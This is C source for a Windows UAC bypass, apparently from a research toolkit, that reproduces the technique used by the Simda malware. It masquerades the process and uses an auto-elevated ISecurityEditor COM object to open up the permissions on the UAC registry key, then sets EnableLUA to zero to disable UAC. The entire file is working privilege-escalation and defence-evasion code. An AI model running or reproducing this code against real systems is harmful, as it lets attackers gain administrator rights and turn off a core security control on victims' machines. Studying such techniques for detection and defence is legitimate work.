/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017
*
*  TITLE:       SIMDA.C
*
*  VERSION:     2.71
*
*  DATE:        08 May 2017
*
*  Simda based UAC bypass using ISecurityEditor.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmMasqueradedAlterObjectSecurityCOM
*
* Purpose:
*
* Change object security through ISecurityEditor(SetNamedInfo).
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
    _In_ LPWSTR lpTargetObject,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _In_ SE_OBJECT_TYPE ObjectType,
    _In_ LPWSTR NewSddl
)
{
    HRESULT          r = E_FAIL;
    BOOL             cond = FALSE;
    IID              xIID_ISecurityEditor;
    CLSID            xCLSID_ShellSecurityEditor;
    ISecurityEditor *SecurityEditor1 = NULL;
    LPOLESTR         pps;

    do {
        if (CLSIDFromString(
            T_CLSID_ShellSecurityEditor,
            &xCLSID_ShellSecurityEditor) != NOERROR) break;

        if (IIDFromString(
            T_IID_ISecurityEditor,
            &xIID_ISecurityEditor) != S_OK) break;

        r = CoCreateInstance(&xCLSID_ShellSecurityEditor, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &xIID_ISecurityEditor, &SecurityEditor1);

        if (r != S_OK)
            break;

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_ShellSecurityEditor,
            CLSCTX_LOCAL_SERVER,
            &xIID_ISecurityEditor,
            &SecurityEditor1);

        if (r != S_OK)
            break;

        if (SecurityEditor1 == NULL) {
            r = E_FAIL;
            break;
        }

        pps = NULL;
        r = SecurityEditor1->lpVtbl->GetSecurity(
            SecurityEditor1,
            lpTargetObject,
            ObjectType,
            SecurityInformation,
            &pps
        );

        if ((r == S_OK) && (pps != NULL)) {
            OutputDebugStringW(pps);
        }

        r = SecurityEditor1->lpVtbl->SetSecurity(
            SecurityEditor1,
            lpTargetObject,
            ObjectType,
            SecurityInformation,
            NewSddl
        );

        if (r == S_OK) {
            OutputDebugStringW(NewSddl);
        }

    } while (cond);

    if (SecurityEditor1 != NULL) {
        SecurityEditor1->lpVtbl->Release(SecurityEditor1);
    }

    return SUCCEEDED(r);
}

/*
* ucmSimdaTurnOffUac
*
* Purpose:
*
* Disable UAC using AutoElevated undocumented ISecurityEditor interface.
* Used by WinNT/Simda starting from 2010 year.
*
*/
BOOL ucmSimdaTurnOffUac(
    VOID
)
{
    BOOL                bResult = FALSE;
    HKEY                hKey;
    DWORD               dwValue;
    WCHAR               szBuffer[MAX_PATH];
    UNICODE_STRING      ustr;
    OBJECT_ATTRIBUTES   obja;

    bResult = ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
        DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE);

    if (bResult) {

        RtlSecureZeroMemory(&ustr, sizeof(ustr));
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, L"\\REGISTRY\\");
        _strcat(szBuffer, T_UACKEY);
        RtlInitUnicodeString(&ustr, szBuffer);
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja))) {

            dwValue = 0;
            RtlInitUnicodeString(&ustr, L"EnableLUA");
            bResult = NT_SUCCESS(NtSetValueKey(
                hKey,
                &ustr,
                0,
                REG_DWORD,
                (PVOID)&dwValue,
                sizeof(DWORD)));

            NtClose(hKey);
        }
    }

    return bResult;
}
